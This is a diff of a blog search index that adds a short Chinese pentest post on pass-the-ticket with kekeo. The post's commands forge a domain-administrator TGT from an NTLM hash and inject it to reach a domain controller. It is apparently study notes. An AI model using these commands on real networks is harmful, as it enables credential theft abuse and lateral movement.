@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>使用kekeo进行PTT</title>
+      <link href="/2022/11/02/kekeoptt/"/>
+      <url>/2022/11/02/kekeoptt/</url>
+      
+        <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3><p>制作票据进行PTT的时候，需要知道对方的ntlm哈希，才能制作</p><h3 id="0x01-过程">0x01 过程</h3><p>1、生成票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:&quot;fzm\administrator&quot; /domain:fzm.cn /ntlm:abce628a814a052c482797c7422e5c99</span><br></pre></td></tr></table></figure><img src="/2022/11/02/kekeoptt/image-20221102160705674.png" alt="image-20221102160705674" style="zoom:50%;"><p>2、导入票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGT_fzm~administrator@FZM.CN_krbtgt~fzm.cn@FZM.CN.kirbi</span><br></pre></td></tr></table></figure><img src="/2022/11/02/kekeoptt/image-20221102161036238.png" alt="image-20221102161036238" style="zoom:50%;"><p>3.查看票据并访问域控</p><img src="/2022/11/02/kekeoptt/image-20221102161249181.png" alt="image-20221102161249181" style="zoom:50%;">]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> PTT </tag>
+            
+            <tag> 横向移动 </tag>
+            
+            <tag> kekeo </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>金银票据</title>
       <link href="/2022/11/02/ticket/"/>
       <url>/2022/11/02/ticket/</url>
@@ -259,6 +288,8 @@
             <tag> MS14-068 </tag>
             
             <tag> PTT </tag>
+            
+            <tag> kekeo </tag>
             
         </tags>
       
